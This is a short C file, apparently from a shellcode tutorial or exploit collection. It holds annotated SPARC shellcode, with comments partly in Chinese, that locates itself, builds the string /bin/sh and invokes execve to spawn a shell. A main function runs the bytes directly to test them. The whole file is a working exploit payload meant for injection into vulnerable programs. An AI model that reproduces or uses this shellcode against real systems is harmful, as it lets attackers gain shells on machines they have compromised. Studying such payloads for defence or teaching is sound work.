unsigned char shellcode[] =

#ifdef V9
"\x9f\x41\x40\x01"  //  rd    %pc,%o7           ! >= sparcv8+
#else
"\x20\xbf\xff\xff"  //  bn,a    .-4
"\x20\xbf\xff\xff"  //  bn,a    .-4
"\x7f\xff\xff\xff"  //  call    .-4
#endif

"\x94\x1a\x80\x0a"  //  xor     %o2, %o2, %o2   ! 延迟插槽
"\x90\x03\xe0\x24"  //  add     %o7, 36, %o0    ! %o7 + 36 指向/bin/sh
"\xd0\x22\x20\x08"  //  st      %o0, [%o0 + 8]  ! 存放字符串指针
"\xc0\x22\x20\x0c"  //  st      %g0, [%o0 + 12] ! NULL结束
"\xc0\x2a\x20\x07"  //  clrb    [ %o0 + 7 ]     ! /bin/sh尾部清零
"\x92\x02\x20\x08"  //  add     %o0, 8, %o1     ! 数组指针
"\x82\x10\x20\x3b"  //  mov     59, %g1
"\x91\xd0\x20\x08"  //  ta      8
"\x2f\x62\x69\x6e"  //  .asciiz \"/bin/sh\"
"\x2f\x73\x68\xff"
;

int main(void) {
    void (*code)() = (void *)shellcode;
    code();
}
